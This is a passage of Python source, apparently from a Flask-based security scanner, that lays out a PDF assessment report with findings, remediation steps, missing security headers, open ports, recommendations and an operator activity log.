                        pdf.set_font('Helvetica', 'B', 7.5)
                        pdf.set_text_color(59, 130, 246)
                        pdf.cell(12, 4.5, num_part[0] + '.')
                        pdf.set_font('Helvetica', '', 7.5)
                        pdf.set_text_color(40, 40, 50)
                        if len(num_part) > 1:
                            pdf.multi_cell(164, 4.5, num_part[1])
                        else:
                            pdf.ln(4.5)
                    elif text.strip() and text.strip()[0].isdigit() and '.' in text[:3]:
                        pdf.set_x(16)
                        pdf.set_font('Helvetica', '', 7.5)
                        pdf.set_text_color(40, 40, 50)
                        pdf.multi_cell(178, 4.5, text.strip())
                    elif text.startswith('  - ') or text.startswith('    - '):
                        pdf.set_x(20)
                        pdf.set_font('Helvetica', '', 7.5)
                        pdf.set_text_color(60, 60, 70)
                        pdf.multi_cell(172, 4.5, text.strip())
                    elif text.startswith('CRITICAL:') or text.startswith('HIGH:') or text.startswith('MEDIUM:') or text.startswith('LOW:'):
                        pdf.set_x(16)
                        pdf.set_font('Helvetica', 'B', 7.5)
                        pdf.set_text_color(227, 30, 36)
                        pdf.multi_cell(178, 4.5, text)
                    elif text.startswith('CVSS '):
                        pdf.set_x(16)
                        pdf.set_font('Helvetica', 'B', 7.5)
                        pdf.set_text_color(234, 88, 12)
                        pdf.multi_cell(178, 4.5, text)
                    elif 'Payload' in text or 'payload' in text:
                        pdf.set_x(16)
                        iy = pdf.get_y()
                        pdf.set_fill_color(255, 250, 240)
                        pdf.rect(16, iy, 176, 4.2, 'F')
                        pdf.set_font('Courier', '', 7)
                        pdf.set_text_color(180, 80, 0)
                        pdf.set_x(18)
                        pdf.multi_cell(172, 4.2, text.strip())
                    elif '<script>' in text or 'fetch(' in text or '.then(' in text:
                        pdf.set_x(16)
                        iy = pdf.get_y()
                        pdf.set_fill_color(255, 245, 245)
                        pdf.rect(16, iy, 176, 4.2, 'F')
                        pdf.set_font('Courier', '', 7)
                        pdf.set_text_color(180, 40, 40)
                        pdf.set_x(18)
                        pdf.multi_cell(172, 4.2, text)
                    elif text.startswith('  ') and not text.startswith('   '):
                        pdf.set_x(16)
                        pdf.set_font('Courier', '', 7)
                        pdf.set_text_color(80, 80, 90)
                        pdf.set_x(18)
                        pdf.multi_cell(172, 4, text)
                    else:
                        pdf.set_x(16)
                        pdf.set_font('Helvetica', '', 7.5)
                        pdf.set_text_color(50, 50, 60)
                        pdf.multi_cell(178, 4.5, text)
                pdf.ln(3)

                # ── Remediation Section ──
                if pdf.get_y() > 240:
                    pdf.add_page()
                ry = pdf.get_y()
                pdf.set_fill_color(22, 163, 74)
                pdf.rect(14, ry, 182, 5.5, 'F')
                pdf.set_xy(16, ry + 0.5)
                pdf.set_text_color(255, 255, 255)
                pdf.set_font('Helvetica', 'B', 7.5)
                pdf.cell(178, 5, 'REMEDIATION RECOMMENDATIONS')
                pdf.set_y(ry + 7)
                rem = finding_remediation(f)
                lines = rem.split(' | ')
                for line in lines:
                    if pdf.get_y() > 272:
                        pdf.add_page()
                    text = safe_text(line.strip())
                    if not text:
                        continue
                    pdf.set_x(16)
                    if text.startswith('Step '):
                        parts = text.split(': ', 1)
                        pdf.set_font('Helvetica', 'B', 7.5)
                        pdf.set_text_color(22, 163, 74)
                        step_text = parts[0] + ':' if len(parts) > 1 else parts[0]
                        pdf.cell(20, 4.5, step_text)
                        pdf.set_font('Helvetica', '', 7.5)
                        pdf.set_text_color(40, 40, 50)
                        detail = parts[1] if len(parts) > 1 else ''
                        pdf.multi_cell(156, 4.5, detail)
                    else:
                        pdf.set_font('Helvetica', '', 7.5)
                        pdf.set_text_color(60, 60, 70)
                        pdf.multi_cell(178, 4.5, text)
                pdf.ln(5)

                if pdf.get_y() < 270:
                    pdf.set_draw_color(220, 220, 225)
                    pdf.set_line_width(0.3)
                    pdf.line(14, pdf.get_y(), 196, pdf.get_y())
                    pdf.ln(6)

        # ─── SECTION 6: SECURITY HEADERS ───
        hdrs = state_copy.get('header_data', {})
        missing_hdrs = hdrs.get('missing_security', [])
        if missing_hdrs:
            section_header('SECURITY HEADERS ANALYSIS', 6)
            add_text(f'The following {len(missing_hdrs)} security headers are missing from the target. '
                     'Missing security headers can expose the application to various attacks.', 9)
            pdf.ln(3)
            pdf.set_font('Helvetica', 'B', 8)
            pdf.set_fill_color(30, 30, 40)
            pdf.set_text_color(255, 255, 255)
            pdf.set_x(14)
            pdf.cell(50, 7, 'Header Name', border=0, fill=True, align='C')
            pdf.cell(136, 7, 'Remediation Guidance', border=0, fill=True, align='C')
            pdf.ln()
            for i, hdr in enumerate(missing_hdrs):
                if pdf.get_y() > 270:
                    pdf.add_page()
                    pdf.set_font('Helvetica', 'B', 8)
                    pdf.set_fill_color(30, 30, 40)
                    pdf.set_text_color(255, 255, 255)
                    pdf.set_x(14)
                    pdf.cell(50, 7, 'Header Name', border=0, fill=True, align='C')
                    pdf.cell(136, 7, 'Remediation Guidance', border=0, fill=True, align='C')
                    pdf.ln()
                rem = SECURITY_HEADER_REMEDIATIONS.get(hdr, 'Implement this security header.')
                if i % 2 == 0:
                    pdf.set_fill_color(248, 248, 250)
                else:
                    pdf.set_fill_color(255, 255, 255)
                pdf.set_font('Helvetica', 'B', 8)
                pdf.set_text_color(30, 30, 40)
                pdf.set_x(14)
                pdf.cell(50, 6, safe_text(hdr), border=0, fill=True)
                pdf.set_font('Helvetica', '', 8)
                pdf.set_text_color(60, 60, 70)
                pdf.cell(136, 6, safe_text(rem[:100]), border=0, fill=True)
                pdf.ln()
            pdf.ln(5)

        # ─── SECTION 7: OPEN PORTS ───
        ports = state_copy.get('port_data', [])
        if ports:
            if pdf.get_y() > 200:
                pdf.add_page()
            else:
                pdf.ln(8)
            pdf.set_fill_color(30, 30, 40)
            pdf.rect(0, pdf.get_y(), 210, 14, 'F')
            pdf.set_text_color(255, 255, 255)
            pdf.set_font('Helvetica', 'B', 12)
            pdf.set_y(pdf.get_y() + 3)
            pdf.cell(0, 10, '  6. OPEN PORTS & SERVICES', new_x='LMARGIN', new_y='NEXT')
            pdf.ln(8)
            add_text(f'Total open ports discovered: {len(ports)}', 9)
            pdf.ln(2)
            pdf.set_font('Helvetica', 'B', 8)
            pdf.set_fill_color(30, 30, 40)
            pdf.set_text_color(255, 255, 255)
            pdf.set_x(14)
            pdf.cell(25, 7, 'Port', border=0, fill=True, align='C')
            pdf.cell(35, 7, 'Service', border=0, fill=True, align='C')
            pdf.cell(40, 7, 'IP Address', border=0, fill=True, align='C')
            pdf.cell(87, 7, 'Banner / Version', border=0, fill=True, align='C')
            pdf.ln()
            high_risk_ports = [21, 23, 445, 3306, 3389, 6379, 27017]
            for i, p in enumerate(ports[:30]):
                if pdf.get_y() > 270:
                    pdf.add_page()
                    pdf.set_font('Helvetica', 'B', 8)
                    pdf.set_fill_color(30, 30, 40)
                    pdf.set_text_color(255, 255, 255)
                    pdf.set_x(14)
                    pdf.cell(25, 7, 'Port', border=0, fill=True, align='C')
                    pdf.cell(35, 7, 'Service', border=0, fill=True, align='C')
                    pdf.cell(40, 7, 'IP Address', border=0, fill=True, align='C')
                    pdf.cell(87, 7, 'Banner / Version', border=0, fill=True, align='C')
                    pdf.ln()
                is_high = p.get('port') in high_risk_ports
                if i % 2 == 0:
                    pdf.set_fill_color(248, 248, 250)
                else:
                    pdf.set_fill_color(255, 255, 255)
                pdf.set_x(14)
                if is_high:
                    pdf.set_text_color(200, 30, 30)
                    pdf.set_font('Helvetica', 'B', 8)
                else:
                    pdf.set_text_color(30, 30, 40)
                    pdf.set_font('Helvetica', '', 8)
                pdf.cell(25, 6, safe_text(str(p.get('port', ''))), border=0, fill=True, align='C')
                pdf.cell(35, 6, safe_text((p.get('service', '') or '')[:20]), border=0, fill=True, align='C')
                pdf.cell(40, 6, safe_text((p.get('ip', '') or '')[:20]), border=0, fill=True, align='C')
                banner = safe_text((p.get('banner', '') or '')[:50])
                if is_high:
                    pdf.set_fill_color(255, 235, 235)
                    pdf.cell(87, 6, f'HIGH RISK - {banner}', border=0, fill=True)
                else:
                    pdf.cell(87, 6, banner, border=0, fill=True)
                pdf.ln()
            pdf.ln(5)

        # ─── SECTION 8 (or next): RECOMMENDATIONS ───
        section_header('RECOMMENDATIONS SUMMARY', 9)
        add_text('Based on the assessment findings, the following prioritized actions are recommended:', 9)
        pdf.ln(3)

        def add_recommendation_block(title, color, items, timeframe):
            if pdf.get_y() > 240:
                pdf.add_page()
            pdf.set_fill_color(*color)
            pdf.rect(14, pdf.get_y(), 4, 22, 'F')
            pdf.set_xy(22, pdf.get_y() + 2)
            pdf.set_text_color(30, 30, 40)
            pdf.set_font('Helvetica', 'B', 10)
            pdf.cell(0, 6, safe_text(title), new_x='LMARGIN', new_y='NEXT')
            pdf.set_x(22)
            pdf.set_text_color(100, 100, 110)
            pdf.set_font('Helvetica', '', 8)
            pdf.cell(0, 5, safe_text(timeframe), new_x='LMARGIN', new_y='NEXT')
            pdf.set_x(22)
            pdf.set_text_color(60, 60, 70)
            pdf.set_font('Helvetica', '', 9)
            for item in items:
                pdf.set_x(22)
                pdf.cell(5, 5, '-', new_x='RIGHT')
                pdf.cell(170, 5, safe_text(item), new_x='LMARGIN', new_y='NEXT')
            pdf.ln(4)

        if critical_cnt > 0:
            add_recommendation_block(
                'IMMEDIATE ACTIONS',
                (227, 30, 36),
                [
                    f'Remediate all {critical_cnt} critical vulnerabilities immediately',
                    'Isolate affected systems if exploitation is active',
                    'Enable enhanced monitoring and logging',
                    'Notify incident response team'
                ],
                'Timeframe: Within 24 hours'
            )
        if high_cnt > 0:
            add_recommendation_block(
                'SHORT TERM ACTIONS',
                (234, 88, 12),
                [
                    f'Address all {high_cnt} high-severity vulnerabilities',
                    'Implement WAF rules for injection-type vulnerabilities',
                    'Review and harden security configurations',
                    'Conduct targeted code review for affected components'
                ],
                'Timeframe: Within 1 week'
            )
        add_recommendation_block(
            'MEDIUM TERM ACTIONS',
            (202, 138, 4),
            [
                'Implement all missing security headers',
                'Review and update SSL/TLS configurations',
                'Address medium and low severity findings',
                'Conduct developer security training'
            ],
            'Timeframe: Within 30 days'
        )
        add_recommendation_block(
            'ONGOING SECURITY PRACTICES',
            (22, 163, 74),
            [
                'Establish regular vulnerability scanning schedule',
                'Implement security monitoring and alerting',
                'Develop and test incident response procedures',
                'Conduct periodic penetration testing'
            ],
            'Timeframe: Continuous'
        )

        # ─── APPENDIX: OPERATOR TIMELINE ───
        if SQLITE_AVAILABLE:
            try:
                with sqlite3_mod.connect(DB_PATH) as conn:
                    conn.row_factory = sqlite3_mod.Row
                    op_rows = conn.execute(
                        'SELECT ts, operator, action_type, target, detail FROM operator_log ORDER BY id DESC LIMIT 100'
                    ).fetchall()
                if op_rows:
                    section_header('APPENDIX: OPERATOR TIMELINE', 10)
                    add_text('Every action during this assessment is logged for accountability and debrief.', 9)
                    pdf.ln(3)
                    op_col_w = [35, 22, 28, 45, 60]
                    op_headers = ['Timestamp', 'Operator', 'Action', 'Target', 'Detail']
                    pdf.set_font('Helvetica', 'B', 7)
                    pdf.set_fill_color(30, 30, 40)
                    pdf.set_text_color(255, 255, 255)
                    for i, h in enumerate(op_headers):
                        pdf.cell(op_col_w[i], 7, h, border=0, align='C', fill=True)
                    pdf.ln()
                    pdf.set_font('Helvetica', '', 6)
                    for ri, row in enumerate(op_rows):
                        if ri % 2 == 0:
                            pdf.set_fill_color(248, 248, 250)
                        else:
                            pdf.set_fill_color(255, 255, 255)
                        pdf.set_text_color(24, 24, 27)
                        pdf.cell(op_col_w[0], 5, safe_text(str(row['ts'] or '')[:19]), border=0, fill=True)
                        pdf.cell(op_col_w[1], 5, safe_text(str(row['operator'] or '')[:10]), border=0, align='C', fill=True)
                        pdf.cell(op_col_w[2], 5, safe_text(str(row['action_type'] or '')[:14]), border=0, align='C', fill=True)
                        pdf.cell(op_col_w[3], 5, safe_text(str(row['target'] or '')[:25]), border=0, fill=True)
                        pdf.cell(op_col_w[4], 5, safe_text(str(row['detail'] or '')[:40]), border=0, fill=True)
                        pdf.ln()
            except Exception:
                pass

        # ─── FOOTER ───
        pdf.set_text_color(160, 160, 160)
        pdf.set_font('Helvetica', '', 7)
        pdf.ln(10)
        pdf.cell(0, 10, f'Security Assessment Report | {datetime.now().strftime("%Y-%m-%d %H:%M")} | CONFIDENTIAL', new_x='LMARGIN', new_y='NEXT', align='C')

        filename = f'infosec_report_{target}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.pdf'
        pdf_bytes = bytes(pdf.output())
        return Response(
            pdf_bytes,
            mimetype='application/pdf',
            headers={'Content-Disposition': f'attachment; filename={filename}'}
        )
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({'status': 'error', 'message': f'PDF generation failed: {str(e)}'}), 500
